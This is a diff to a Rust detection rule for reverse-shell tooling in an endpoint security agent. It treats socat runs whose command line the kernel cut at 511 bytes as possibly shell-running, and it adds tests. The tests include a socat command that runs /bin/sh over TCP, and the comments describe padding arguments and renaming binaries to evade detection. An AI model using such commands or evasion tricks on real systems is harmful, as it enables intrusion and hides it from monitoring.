@@ -17,6 +17,14 @@
 //! Lab PR 166: a kill takes the tree. The shell that `socat EXEC:` runs is
 //! its child, and a copied tool is the payload itself.
 //!
+//! External audit EBPF-021: the exec record keeps the first 511 bytes of
+//! the command line, and filler options (`-d` repeated) pushed the shell
+//! address past them: the distribution's socat then read as a plain relay.
+//! When the kernel marks the argv as cut (or unread) and the part kept
+//! runs no shell, the rule does not conclude that none does: the exec is
+//! recorded at the severity of one that does (Log, Critical), the cut
+//! named, instead of the relay's High record.
+//!
 //! Names are chosen by whoever runs the binary; a renamed tool evades this
 //! rule, which the network and staging rules back up.
 
@@ -102,25 +110,45 @@ impl Rule for R006ReverseShellTooling {
         let image = exe.path_or(filename);
         let distribution = crate::posture::lineage::in_system_tree(image)
             && DISTRIBUTION_BIN_DIRS.iter().any(|d| image.starts_with(d));
+        let cut = super::argv_cut_note(event);
         let verdict = if comm == "socat" && distribution && !socat_runs_a_shell(argv) {
-            build_verdict(
-                self,
-                event,
-                ResponseAction::Log,
-                Severity::High,
-                &format!(
-                    "socat installed by the distribution ({image}) — recorded, not \
-                     killed: the relay has legitimate uses; one running a shell \
-                     (EXEC:/SYSTEM:/SHELL:) is killed"
+            match cut {
+                // External audit EBPF-021: no shell in the part kept is not
+                // "no shell".
+                Some(note) => build_verdict(
+                    self,
+                    event,
+                    ResponseAction::Log,
+                    Severity::Critical,
+                    &format!(
+                        "socat installed by the distribution ({image}) — not \
+                         classified: {note}; an address past the cut may run a \
+                         shell (EXEC:/SYSTEM:/SHELL:), so it is recorded at the \
+                         severity of one that does, not as a relay"
+                    ),
                 ),
-            )
+                None => build_verdict(
+                    self,
+                    event,
+                    ResponseAction::Log,
+                    Severity::High,
+                    &format!(
+                        "socat installed by the distribution ({image}) — recorded, not \
+                         killed: the relay has legitimate uses; one running a shell \
+                         (EXEC:/SYSTEM:/SHELL:) is killed"
+                    ),
+                ),
+            }
         } else {
             build_verdict(
                 self,
                 event,
                 ResponseAction::KillProcessTree,
                 Severity::Critical,
-                "Known offensive security tooling detected",
+                &super::with_argv_cut_note(
+                    "Known offensive security tooling detected".to_string(),
+                    event,
+                ),
             )
         };
         Some(judgement.apply(verdict, comm))
@@ -130,7 +158,7 @@ impl Rule for R006ReverseShellTooling {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::decision::rules::testutil::{spawn, spawn_exe, spawn_full};
+    use crate::decision::rules::testutil::{argv_cut, spawn, spawn_exe, spawn_full};
 
     fn rule() -> R006ReverseShellTooling {
         R006ReverseShellTooling::new(Arc::new(CommAllowlist::default()))
@@ -229,6 +257,62 @@ mod tests {
             let v = rule().evaluate(&e).unwrap();
             assert_eq!(v.action, ResponseAction::Log, "{args:?}");
         }
+    }
+
+    /// External audit EBPF-021: filler options push the shell address past
+    /// the 511 bytes the kernel keeps. A cut argv whose kept part runs no
+    /// shell is not a relay: recorded at Critical, the cut named. A whole
+    /// argv keeps the relay's High record; a shell in the kept part is
+    /// still killed; a copy is still killed, the cut named.
+    #[test]
+    fn r006_socat_with_truncated_argv_is_logged() {
+        let mut args = vec!["socat"];
+        args.extend(std::iter::repeat_n("-d", 200));
+        args.push("TCP:127.0.0.1:9");
+        let padded = argv_cut(spawn_full("socat", "/usr/bin/socat", 1000, &args, "bash"));
+        let v = rule().evaluate(&padded).expect("fires");
+        assert_eq!(v.action, ResponseAction::Log);
+        assert_eq!(v.severity, Severity::Critical);
+        assert!(
+            v.reasoning.contains("argv truncated at 511 bytes"),
+            "{}",
+            v.reasoning
+        );
+        assert!(v.reasoning.contains("not classified"), "{}", v.reasoning);
+
+        // Unread argv: the same, named as unread.
+        let unread = argv_cut(spawn_exe("socat", "/usr/bin/socat", "/usr/bin/socat", 0));
+        let v = rule().evaluate(&unread).unwrap();
+        assert_eq!(
+            (v.action, v.severity),
+            (ResponseAction::Log, Severity::Critical)
+        );
+        assert!(v.reasoning.contains("argv not read"), "{}", v.reasoning);
+
+        // The same argv, whole: the relay's record.
+        let whole = spawn_full("socat", "/usr/bin/socat", 1000, &args, "bash");
+        let v = rule().evaluate(&whole).unwrap();
+        assert_eq!(
+            (v.action, v.severity),
+            (ResponseAction::Log, Severity::High)
+        );
+
+        // A shell in the part kept: killed, cut or not.
+        let shell = argv_cut(spawn_full(
+            "socat",
+            "/usr/bin/socat",
+            1000,
+            &["socat", "TCP:h:1", "EXEC:/bin/sh"],
+            "bash",
+        ));
+        let v = rule().evaluate(&shell).unwrap();
+        assert_eq!(v.action, ResponseAction::KillProcessTree);
+        assert!(v.reasoning.contains("argv truncated"), "{}", v.reasoning);
+
+        // A copy: killed as before, the cut named.
+        let copy = argv_cut(spawn_exe("socat", "socat", "/tmp/socat", 0));
+        let v = rule().evaluate(&copy).unwrap();
+        assert_eq!(v.action, ResponseAction::KillProcessTree);
     }
 
     /// External audit PROC-010: an operator allowlist, judged on what the
